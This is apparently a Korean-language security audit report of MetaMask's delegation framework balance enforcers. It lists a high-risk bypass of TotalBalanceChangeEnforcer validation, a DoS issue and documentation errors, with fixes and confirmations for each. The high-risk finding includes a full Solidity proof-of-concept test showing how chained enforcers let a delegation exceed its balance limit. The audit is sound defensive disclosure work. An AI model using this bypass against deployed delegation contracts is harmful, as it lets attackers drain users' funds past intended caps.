**수석 감사**

[0kage](https://twitter.com/0kage_eth)

[Chinmay Farkya](https://twitter.com/dev_chinmayf)

**보조 감사**


---

# 발견 사항

## 높은 위험 (High Risk)

### 상태 변경 인포서(enforcer)와 혼합될 때 `TotalBalanceEnforcer` 검증 우회

**설명:** 전체 잔액 변경 인포서(Total Balance Change Enforcer)는 위임 체인에서 상태를 수정하는 인포서(예: `NativeTokenPaymentEnforcer`)와 혼합될 때 최종 잔액 상태를 검증하지 못합니다.

`afterAllHook`에서의 조기 반환(early return) 우회로 인해 상태 수정 인포서 뒤에 위치한 전체 잔액 인포서가 검증을 완전히 건너뛰게 되어, 감지되지 않고 잔액 제약 조건을 위반할 수 있게 됩니다.

이 취약점은 전체 잔액 변경 인포서가 첫 번째 검증 후 공유 추적기(shared tracker)를 정리(cleanup)하기 때문에 발생하며, 이후의 인포서들이 수정된 최종 상태를 검증해야 할 때에도 조기 반환을 하게 만듭니다.

모든 전체 잔액 변경 인포서는 다음과 같은 취약한 패턴을 포함하고 있습니다:

```solidity
function afterAllHook(...) public override {
    // ... 설정 코드 ...

    BalanceTracker memory balanceTracker_ = balanceTracker[hashKey_];

    // @audit 여기서 조기 반환함
    if (balanceTracker_.expectedIncrease == 0 && balanceTracker_.expectedDecrease == 0) return;

    // ... 우회되는 검증 로직 ...

    delete balanceTracker[hashKey_]; // 검증 후 정리
}
```

다음과 같이 동일한 수신자에게 영향을 미치는 혼합된 인포서 유형이 있는 위임 체인을 고려해 보십시오:

```text
Alice: `TotalBalanceChangeEnforcer` (순수 효과 검증)
Bob: `NativeTokenPaymentEnforcer` (afterAllHook 동안 잔액 수정)
Dave: `TotalBalanceChangeEnforcer` (최종 상태를 검증해야 함)
```

흐름은 다음과 같습니다:

1. `beforeAllHook` 단계: Alice와 Dave의 인포서가 잔액 요구 사항을 누적합니다.
2. 주요 트랜잭션이 실행됩니다.
3. `afterAllHook` 단계:
 - Alice의 인포서: 누적된 요구 사항에 대해 순 잔액 변경을 검증하고 공유 추적기를 정리합니다.
 - Bob의 인포서: `NativeTokenPaymentEnforcer`가 delegationManager.redeemDelegations(...)를 통해 추가 ETH를 전송합니다.
```solidity
// NativeTokenPaymentEnforcer.sol
function afterAllHook(...) public override {
    // ... 설정 ...

    uint256 balanceBefore_ = recipient_.balance;

    // @audit afterAll 훅 동안 ETH 전송
    delegationManager.redeemDelegations(permissionContexts_, encodedModes_, executionCallDatas_);

    uint256 balanceAfter_ = recipient_.balance;
    require(balanceAfter_ >= balanceBefore_ + amount_, "NativeTokenPaymentEnforcer:payment-not-received");
}
```

 - Dave의 인포서: 정리된 추적기(expectedIncrease == 0 && expectedDecrease == 0)를 발견 → 조기 반환, 검증 없음

**Dave의 인포서는 Bob의 지불 전송이 포함된 최종 잔액 상태를 절대 검증하지 않습니다.**

**파급력:** 개발자들은 각 `TotalBalanceChangeEnforcer`가 최종 잔액 상태를 검증할 것으로 기대합니다. 특히 인포서 순서가 `NativeTokenPaymentEnforcer`와 같은 상태 변경 인포서 뒤에 있을 때 더욱 그렇습니다. 조기 반환은 상태 수정 인포서 뒤에 위치한 인포서가 완전히 우회되도록 합니다. 이는 특히 `TotalBalanceChangeEnforcer`가 단일 배치(batch) 내의 여러 실행에서 상태를 공유할 수 있는 배치 실행 환경에서 발생할 수 있는 시나리오입니다.

**개념 증명 (Proof of Concept):** 테스트 스위트에 다음 테스트를 추가하십시오:

```solidity
// SPDX-License-Identifier: MIT AND Apache-2.0
pragma solidity 0.8.23;

import { Implementation, SignatureType } from "./utils/Types.t.sol";
import { BaseTest } from "./utils/BaseTest.t.sol";
import { Execution, Caveat, Delegation } from "../src/utils/Types.sol";
import { Counter } from "./utils/Counter.t.sol";
import { EncoderLib } from "../src/libraries/EncoderLib.sol";
import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { NativeTokenTotalBalanceChangeEnforcer } from "../src/enforcers/NativeTokenTotalBalanceChangeEnforcer.sol";
import { NativeTokenTransferAmountEnforcer } from "../src/enforcers/NativeTokenTransferAmountEnforcer.sol";
import { NativeTokenPaymentEnforcer } from "../src/enforcers/NativeTokenPaymentEnforcer.sol";
import { ArgsEqualityCheckEnforcer } from "../src/enforcers/ArgsEqualityCheckEnforcer.sol";
import { IDelegationManager } from "../src/interfaces/IDelegationManager.sol";
import { EIP7702StatelessDeleGator } from "../src/EIP7702/EIP7702StatelessDeleGator.sol";
import "forge-std/Test.sol";

/**
 * @title 전체 잔액 인포서 취약점 테스트 - 3-체인 시나리오
 * @notice TotalBalanceChangeEnforcer가 우회되는 취약점 시연
 *         3단계 위임 체인: Alice -> Bob -> Dave
 *         - Alice는 수신자를 Alice로 하는 NativeTokenTotalBalanceChangeEnforcer 사용
 *         - Bob은 Alice에게서 다른 수신자로 3 ETH를 전송하는 NativeTokenPaymentEnforcer 사용
 *         - Dave는 Alice와 동일한 수신자로 NativeTokenTotalBalanceChangeEnforcer 사용
 *         - Dave는 Alice의 잔액을 0.3 ETH 감소시키는 트랜잭션 실행
 *         Alice의 잔액 확인 후, 잔액 추적기가 정리되고, Bob의 NativeTokenPaymentEnforcer를 통해
 *         지불이 이루어졌음에도 불구하고 Dave의 확인은 우회됩니다.
 *         afterAllHook은 루트에서 리프로 이동하므로, Dave의 NativeTokenTotalBalanceChangeEnforcer는
 *         Bob에 의해 이루어진 지불을 인지하지 못하여 성공적인 실행으로 이어집니다.
 */
contract TotalBalanceEnforcer3ChainVulnerabilityTest is BaseTest {
    using MessageHashUtils for bytes32;

    // Enforcers
    NativeTokenTotalBalanceChangeEnforcer public balanceEnforcer;
    NativeTokenPaymentEnforcer public paymentEnforcer;
    NativeTokenTransferAmountEnforcer public transferEnforcer;
    ArgsEqualityCheckEnforcer public argsEnforcer;

    // Test addresses
    address public sharedRecipient;
    address public bobPaymentRecipient;

    constructor() {
        IMPLEMENTATION = Implementation.EIP7702Stateless;
        SIGNATURE_TYPE = SignatureType.EOA;
    }

    function setUp() public override {
        super.setUp();

        // Deploy enforcers
        balanceEnforcer = new NativeTokenTotalBalanceChangeEnforcer();
        argsEnforcer = new ArgsEqualityCheckEnforcer();
        transferEnforcer = new NativeTokenTransferAmountEnforcer();
        paymentEnforcer = new NativeTokenPaymentEnforcer(IDelegationManager(address(delegationManager)), address(argsEnforcer));

        // Set up test addresses
        sharedRecipient = address(users.alice.deleGator);
        bobPaymentRecipient = address(0x1337);

        // Fund accounts
        vm.deal(address(users.alice.deleGator), 10 ether);
        vm.deal(address(users.bob.deleGator), 10 ether);
        vm.deal(address(users.dave.deleGator), 10 ether);
        vm.deal(sharedRecipient, 5 ether);

        // Fund EntryPoint
        vm.prank(address(users.alice.deleGator));
        entryPoint.depositTo{ value: 1 ether }(address(users.alice.deleGator));

        vm.prank(address(users.bob.deleGator));
        entryPoint.depositTo{ value: 1 ether }(address(users.bob.deleGator));

        vm.prank(address(users.dave.deleGator));
        entryPoint.depositTo{ value: 1 ether }(address(users.dave.deleGator));
    }

    /**
     * @dev 3단계 위임 체인을 통한 주요 취약점 시연
     * 취약점이 존재하면 이 테스트는 성공하고, 수정되면 실패해야 합니다.
     */
    function test_totalBalanceChange_with_PaymentEnforcer() public {
        uint256 initialBalance = sharedRecipient.balance;

        // 1: Alice -> Bob 위임 생성
        (Delegation memory aliceToBob, bytes32 aliceToBobHash) = _createAliceToBobDelegation();

        // 2: 지불 강제가 포함된 Bob -> Dave 위임 생성
        (Delegation memory bobToDave, bytes32 bobToDaveHash) = _createBobToDaveDelegationWithPayment(aliceToBobHash);

        // 3: Dave의 위임 생성
        Delegation memory daveDelegation = _createDaveDelegation(bobToDaveHash);

        // 4: 실행 생성 - Alice의 잔액에서 0.3 ETH 전송
        Execution memory execution = Execution({ target: address(0xBEEF), value: 0.3 ether, callData: "" });

        // 5: 위임 체인 설정
        Delegation[] memory delegationChain = new Delegation[](3);
        delegationChain[0] = daveDelegation;
        delegationChain[1] = bobToDave;
        delegationChain[2] = aliceToBob;

        uint256 bobInitialBalance = bobPaymentRecipient.balance;

        // 6: 위임 체인 실행
        invokeDelegation_UserOp(users.dave, delegationChain, execution);

        uint256 finalBalance = sharedRecipient.balance;
        uint256 bobFinalBalance = bobPaymentRecipient.balance;

        // 7: 취약점 검증
        uint256 totalDecrease = initialBalance - finalBalance;
        uint256 bobPayment = bobFinalBalance - bobInitialBalance;

        //  Alice는 총 3.3 ETH 손실 (실행에서 0.3 ETH + Native Token Payment 인포서에서 3 ETH),
        // Bob은 3 ETH 받음
        // 예상 동작: 트랜잭션은 여기에 도달하기 전에 revert되어야 함
        assertEq(totalDecrease, 3.3 ether, "Total decrease should be 3.3 ETH");
        assertEq(bobPayment, 3 ether, "Bob should receive 3 ETH payment");
    }

    function _createAliceToBobDelegation() internal returns (Delegation memory, bytes32) {
        bytes memory terms = abi.encodePacked(
            true, // enforceDecrease
            sharedRecipient,
            uint256(1 ether) // max 1 ETH decrease
        );

        Caveat[] memory caveats = new Caveat[](1);
        caveats[0] = Caveat({ enforcer: address(balanceEnforcer), terms: terms, args: "" });

        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: ""
        });

        delegation = signDelegation(users.alice, delegation);
        bytes32 delegationHash = EncoderLib._getDelegationHash(delegation);

        return (delegation, delegationHash);
    }

    function _createBobToDaveDelegationWithPayment(bytes32 aliceToBobHash) internal returns (Delegation memory, bytes32) {
        // Step 1: Create the Bob -> Dave delegation structure first (without payment allowance)
        bytes memory bobPaymentTerms = abi.encodePacked(bobPaymentRecipient, uint256(3 ether));

        Caveat[] memory bobCaveats = new Caveat[](1);
        bobCaveats[0] = Caveat({
            enforcer: address(paymentEnforcer),
            terms: bobPaymentTerms,
            args: "" // Will be filled with allowance delegation
         });

        Delegation memory bobToDave = Delegation({
            delegate: address(users.dave.deleGator),
            delegator: address(users.bob.deleGator),
            authority: aliceToBobHash,
            caveats: bobCaveats,
            salt: 0,
            signature: ""
        });

        // Step 2: Sign to get the delegation hash
        bobToDave = signDelegation(users.bob, bobToDave);
        bytes32 bobToDaveHash = EncoderLib._getDelegationHash(bobToDave);

        // Step 3: Create allowance delegation that uses THIS delegation hash
        Delegation memory paymentAllowance = _createPaymentAllowanceDelegation(bobToDaveHash, address(users.dave.deleGator));

        // Step 4: Now set the args with the properly configured allowance delegation
        Delegation[] memory allowanceDelegations = new Delegation[](1);
        allowanceDelegations[0] = paymentAllowance;
        bobToDave.caveats[0].args = abi.encode(allowanceDelegations);

        return (bobToDave, bobToDaveHash);
    }

    function _createPaymentAllowanceDelegation(bytes32 mainDelegationHash, address redeemer) internal returns (Delegation memory) {
        // ArgsEqualityCheckEnforcer terms: pre-populated with delegation hash + redeemer
        // This matches the pattern from the working tests
        bytes memory argsEnforcerTerms = abi.encodePacked(mainDelegationHash, redeemer);

        Caveat[] memory caveats = new Caveat[](2);

        // Args enforcer with pre-populated terms
        caveats[0] = Caveat({
            enforcer: address(argsEnforcer),
            terms: argsEnforcerTerms, // Pre-populated with delegation hash + redeemer
            args: "" // Will be populated dynamically by PaymentEnforcer during execution
         });

        // Transfer amount enforcer - allows up to 3 ETH transfer
        caveats[1] = Caveat({ enforcer: address(transferEnforcer), terms: abi.encode(uint256(3 ether)), args: "" });

        Delegation memory delegation = Delegation({
            delegate: address(paymentEnforcer),
            delegator: address(users.alice.deleGator), // Alice delegates payment authority from her balance
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 1,
            signature: ""
        });

        return signDelegation(users.alice, delegation);
    }

    function _createDaveDelegation(bytes32 bobToDaveHash) internal returns (Delegation memory) {
        bytes memory daveTerms = abi.encodePacked(
            true, // enforceDecrease
            sharedRecipient,
            uint256(0.5 ether) // max 0.5 ETH decrease
        );

        Caveat[] memory daveCaveats = new Caveat[](1);
        daveCaveats[0] = Caveat({ enforcer: address(balanceEnforcer), terms: daveTerms, args: "" });

        Delegation memory delegation = Delegation({
            delegate: address(users.dave.deleGator),
            delegator: address(users.dave.deleGator),
            authority: bobToDaveHash,
            caveats: daveCaveats,
            salt: 0,
            signature: ""
        });

        return signDelegation(users.dave, delegation);
    }
}
```

**권장 완화 방법:** `BalanceTracker`에 남은 `TotalBalanceChangeEnforcer` 경고(caveat) 수를 세는 `validationsRemaining`을 추가하는 것을 고려하십시오.

```solidity
struct BalanceTracker {
    uint256 balanceBefore;
    uint256 expectedIncrease;
    uint256 expectedDecrease;
    uint256 validationsRemaining; // 최종 검증을 위한 카운트다운
}

function beforeAllHook(...) {
    // ... 기존 로직 ...
    balanceTracker_.validationsRemaining++;
}

function afterAllHook(...) {
    // ... 설정 ...

    balanceTracker_.validationsRemaining--;

    // 모든 전체 잔액 변경 인포서가 처리되었을 때만 검증 및 정리 수행
    if (balanceTracker_.validationsRemaining == 0) {
        // 검증 수행
        // ... 검증 로직 ...
        delete balanceTracker[hashKey_];
    }
}
```

**Metamask:** [PR 144](https://github.com/MetaMask/delegation-framework/pull/144/commits/906027ccb12dea6e0f32527bbff64f3b89c71881)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 낮은 위험 (Low Risk)

### `TotalBalanceChange` 인포서 클래스의 지나치게 제한적인 잔액 일관성 확인으로 인한 잠재적 DoS

**설명:** `TotalBalanceChange` 인포서 클래스는 `beforeAll` 훅에 방어적인 확인을 포함하고 있어, 배치 실행 간(cross-execution batch) 시나리오에서 DoS 공격을 유발할 수 있으며 합법적인 잔액 수정 인포서 사용을 방해할 수 있습니다.

이 문제는 `beforeAll` 훅 단계 동안 잔액 불변성을 가정하는 지나치게 제한적인 검증에서 비롯됩니다.

```solidity
function beforeAllHook(...) public override {
    // ... 설정 코드 ...

    uint256 currentBalance_ = IERC20(token_).balanceOf(recipient_);
    if (balanceTracker_.expectedDecrease == 0 && balanceTracker_.expectedIncrease == 0) {
        balanceTracker_.balanceBefore = currentBalance_;
        emit TrackedBalance(msg.sender, recipient_, token_, currentBalance_);
    } else {
        // @audit 지나치게 제한적인 확인은 합법적인 인포서를 막을 수 있음
        require(balanceTracker_.balanceBefore == currentBalance_, "ERC20TotalBalanceChangeEnforcer:balance-changed");
    }
    // ...
}
```
위의 확인은 `beforeAll` 훅에서 상태를 변경할 수 있는 인포서가 없을 것이라고 가정합니다. 실행 전 토큰 전송(예: 수수료 또는 담보를 에스크로 계좌로 이동)을 요구하는 미래의 `prepaymentEnforcer`가 구현된다고 상상해 보십시오. 현재의 잔액 검증은 `TotalBalanceChange` 인포서를 그러한 인포서와 호환되지 않게 만듭니다.

다음 배치 실행 시나리오를 고려해 보십시오:

```solidity
// 실행 1: Bob이 Alice를 위해 TotalBalanceChangeEnforcer 사용
// 실행 2: Dave가 Alice를 위해 PrepaymentEnforcer + TotalBalanceChangeEnforcer 사용

// 공격 흐름:
// 1. Exec1 TotalBalanceChangeEnforcer.beforeAllHook: balanceBefore = Alice의 현재 잔액 설정
// 2. Exec2 PrepaymentEnforcer.beforeAllHook: Alice로부터 1 ETH 수집 → Alice 잔액 변경
// 3. Exec2 TotalBalanceChangeEnforcer.beforeAllHook: require(old_balance == new_balance) → REVERT
// 4. 전체 배치 트랜잭션 실패
```

**파급력:** 지나치게 제한적인 검증은 특정 인포서 조합이 작동 중일 때 전체 배치 트랜잭션에 대한 DoS를 유발할 수 있습니다.

**권장 완화 방법:** 제한적인 잔액 일관성 확인을 단순 덮어쓰기로 교체하는 것을 고려하십시오. 덮어쓰기는 마지막 `TotalBalanceChangeEnforcer`가 모든 `afterAllHook` 작업의 기준이 됨을 의미합니다.

현재 잔액 확인은 "보안" 관점에서 아무런 가치를 더하지 않지만 DoS 및 인포서 호환성 위험을 추가합니다.

```solidity
function beforeAllHook(...) public override {
    // ... 설정 코드 ...

    uint256 currentBalance_ = IERC20(token_).balanceOf(recipient_);

    if (balanceTracker_.expectedDecrease == 0 && balanceTracker_.expectedIncrease == 0) {
        balanceTracker_.balanceBefore = currentBalance_;
        emit TrackedBalance(msg.sender, recipient_, token_, currentBalance_);
    } else {
        // @audit 일치를 요구하는 대신 현재 잔액으로 기준 업데이트
        balanceTracker_.balanceBefore = currentBalance_;
    }
    // ...
}
```

**Metamask:** [PR 144](https://github.com/MetaMask/delegation-framework/pull/144/commits/1e49f851b4bc09987969ed9426f59d3d40af3828)에서 수정되었습니다.

**Cyfrin:** 확인됨.

\clearpage
## 정보성 (Informational)

### "TotalBalanceChangeEnforcer"에 대한 불충분한 문서로 인한 인포서의 잘못된 사용

**설명:** 전체 잔액 변경 인포서에 대한 현재 문서는 오해의 소지가 있으며 각 인포서 유형을 언제 사용해야 하는지에 대한 명확한 지침이 부족합니다. 이러한 혼란으로 인해 개발자는 `BalanceChangeEnforcer` 대신 `TotalBalanceChangeEnforcer`를 독립적인 보안 제약 조건으로 잘못 사용하여, 잘못된 제약 조건을 통해 보안이 약화될 수 있습니다.

문서는 근본적으로 다른 두 가지 사용 사례를 명확하게 구분하지 못합니다:

_독립적인 보안 제약 조건_ - 각각 제한을 부과하는 여러 위임
_조정된 다중 작업 트랜잭션_ - 여러 단계가 있는 단일 복합 트랜잭션

현재 문서는 충분한 맥락 없이 다음 예시를 제공합니다:

```text
ERC20TotalBalanceChangeEnforcer의 3개 인스턴스가 있는 위임 체인을 고려하십시오:

Enforcer 1: 최소 1000 토큰 증가 예상
Enforcer 2: 최소 200 토큰 증가 예상
Enforcer 3: 최대 300 토큰 감소 예상

예상 변경 사항 누적: +1000 + 200 - 300 = +900
최종 잔액이 최소 900 토큰 증가했는지 검증
```

문서는 다음을 설명하지 않습니다:

- 여기서 가장 제한적인 제약 조건을 취하는 것보다 누적이 적절한 이유
- 이 패턴이 언제 사용되어야 하는지
- 개별 인포서 요구 사항(Enforcer 1의 ≥1000 요구 사항)에는 어떤 일이 발생하는지

현재 문서는 개발자가 인포서 유형을 선택할 수 있는 지침이 부족하여 잘못된 사용 패턴으로 이어집니다.

누락된 또 다른 중요한 통찰력은 `TotalBalanceChangeEnforcer` 클래스의 경고(caveat)가 배치 실행 환경에서 여러 실행에 걸쳐 상태를 유지할 수 있다는 사실입니다. `hashkey`에 위임 해시가 포함되지 않으므로, 토큰과 수신자가 동일한 한 동일한 `TotalBalanceChangeEnforcer`가 여러 관련 없는 실행 호출 데이터(call datas) 간에 상태를 공유할 수 있습니다.

**파급력:** 잘못된 인포서 유형을 사용하는 개발자는 제약 조건 위반 및 보안 우회를 초래합니다.

예를 들어, 개발자의 의도가 점진적으로 더 엄격한 위임 체인을 만드는 것이라면:

```text
Alice가 Bob에게 위임: "Treasury는 최대 100 ETH 손실 가능"
Bob이 Dave에게 위임: "Treasury는 최대 50 ETH 손실 가능" (더 제한적)
예상 동작: 50 ETH 제한 강제 (더 엄격한 것이 승리)

TotalBalanceChangeEnforcer 사용 시:
Alice: TotalBalanceChangeEnforcer (expectedDecrease = 100 ETH)
Bob: TotalBalanceChangeEnforcer (expectedDecrease = 50 ETH)
누적: 100 + 50 = 150 ETH 총 감소 허용
```

위의 예에서 위임 체인은 더 제한적인 대신 더 허용적이 됩니다.

**권장 완화 방법:** 다음을 고려하십시오:

1. 전체 잔액 변경 인포서 대 잔액 변경 인포서를 언제 사용해야 하는지에 대해 개발자에게 명확한 맥락을 제공하도록 문서를 업데이트하는 것을 고려하십시오.
2. `배치 실행` 환경에서의 여러 실행이 동일한 `TotalBalanceChangeEnforcer` 컨트랙트 인스턴스를 사용할 수 있으므로 전체 잔액 상태를 공유할 수 있음을 명확히 명시하는 문서를 추가하는 것을 고려하십시오.
3. 명확성을 높이기 위해 `TotalBalanceChangeEnforcer`의 이름을 `MultiOperationBalanceEnforcer`로 변경하는 것을 고려하십시오.

**Metamask:** [PR 144](https://github.com/MetaMask/delegation-framework/pull/144/commits/7e680b27e29aaa1caaacd33286d1346376cab3c3)에서 수정되었습니다.

**Cyfrin:** 확인됨.

### afterAllHook() natspec의 오해의 소지가 있는 문서

**설명:** `ERC20TotalBalanceChangeEnforcer :: afterAllHook()`에서 natspec은 "이 함수는 수신자의 토큰 잔액이 최소한 총 예상 금액만큼 변경되었음을 검증합니다"라고 말하지만, 이는 올바르지 않습니다.

순 효과가 예상 감소인 경우, 허용되는 실제 잔액 변경은 최대 감소에 의해 제한되며, 이 경우 잔액은 "최소한 예상 금액만큼" 변경되지 않습니다.

마찬가지로 다음 인포서의 `afterAllHook()` natspec도 불명확합니다:
- ERC1155TotalBalanceChangeEnforcer
- ERC721TotalBalanceChangeEnforcer
- NativeTokenTotalBalanceChangeEnforcer

예를 들어, `ERC1155TotalBalanceChangeEnforcer`에서는 "이 함수는 수신자의 ERC1155 토큰 잔액이 예상 금액만큼 변경되었음을 강제합니다"라고 말합니다. 그러나 이는 "잔액은 항상 예상 금액만큼 변경되어야 한다"라고 해석될 수 있는 반면, 순 예상 감소의 경우에는 "예상 maxDecrease"보다 낮은 변경도 허용됩니다.

**파급력:** 잘못된 natspec은 개발자가 이러한 인포서의 설계를 오해하게 만들 수 있습니다.

**권장 완화 방법:** 이 모든 곳의 natspec을 "이 함수는 수신자의 토큰 잔액이 예상 한도 내에서 변경되었음을 검증합니다"로 변경해야 합니다.

**Metamask:** [PR 144](https://github.com/MetaMask/delegation-framework/pull/144/commits/7e680b27e29aaa1caaacd33286d1346376cab3c3)에서 해결되었습니다.

**Cyfrin:** 확인됨.

### ERC1155TotalBalanceChangeEnforcer에 대한 잘못된 컨트랙트 natspec

**설명:** `ERC1155TotalBalanceChangeEnforcer`에 대한 컨트랙트 natspec에는 인포서에 잔액 상태가 저장되는 방식에 대한 몇 가지 잘못된 설명이 있습니다.

- "상환(redemption) 내에서 수신자/토큰 쌍당 초기 잔액을 추적하고 예상 증가 및 감소를 누적합니다" => 누적된 예상 금액은 수신자-토큰-토큰ID 조합별로 저장되므로 올바르지 않습니다.
- "동일한 수신자/토큰 쌍을 감시하는 인포서 간에 상태가 공유됩니다" => 다시 말하지만 상태는 동일한 수신자-토큰-토큰ID 조합에 대해서만 공유됩니다.

**파급력:** 이러한 주석은 `ERC1155TotalBalanceChangeEnforcer`의 의도된 설계를 잘못 설명합니다. 스토리지 키 파생을 위해 여기에 tokenID를 포함하는 것은 매우 중요합니다.

**권장 완화 방법:** ERC1155 인포서의 잔액 스토리지가 `recipient-token-tokenID` 조합에 따라 공유됨을 올바르게 명시하도록 natspec을 수정하는 것을 고려하십시오.

**Metamask:** 수정됨.

**Cyfrin:** 확인됨.

\clearpage
